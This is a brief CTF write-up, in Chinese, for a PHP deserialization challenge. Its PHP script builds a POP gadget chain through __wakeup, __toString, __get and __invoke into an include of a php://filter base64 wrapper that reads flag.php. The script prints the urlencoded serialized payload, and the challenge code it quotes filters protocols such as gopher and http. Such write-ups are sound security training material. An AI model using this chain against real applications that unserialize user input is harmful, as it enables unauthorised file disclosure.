# WP
# 知识点
普通反序列化<br />有protected属性，需要进行urlencoded来保存%00%00<br />payload
```php
<?php
  //flag is in flag.php
  //WTF IS THIS?
  //Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
  //And Crack It!
  class Modifier {
  protected  $var = "php://filter/convert.base64-encode/resource=flag.php";
public function append($value){
  echo "<br>"."step 5"."<br>";
  include($value);
}
public function __invoke(){
  echo "<br>"."step 4"."<br>";
  $this->append($this->var);
    }
    }

    class Show{
    public $source;
    public $str;
    //    public function __construct($file='index.php'){
    //        $this->source = $file;
    //        echo 'Welcome to '.$this->source."<br>";
    //    }
    public function __toString(){
    echo "<br>".'step 2'."<br>";
    return $this->str->source;
    }

    public function __wakeup(){
    echo "<br>".'step 1'."<br>";
    if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
    echo "hacker";
    $this->source = "index.php";
    }else{
    echo "<br>"."no"."<br>";
    }
    }
    }

    class Test{
    public $p;
    public function __construct(){
    $this->p = array();
    }

    public function __get($key){
    echo "<br>".'step 3'."<br>";
    $function = $this->p;
    return $function();
    }
    }

    $show= new Show();
    $show2 = new Show();
    $modifier = new Modifier();
    $test = new Test();

    $test->p = $modifier;
    $show2->str = $test;
    $show->source = $show2;

    echo urlencode(serialize($show));
```
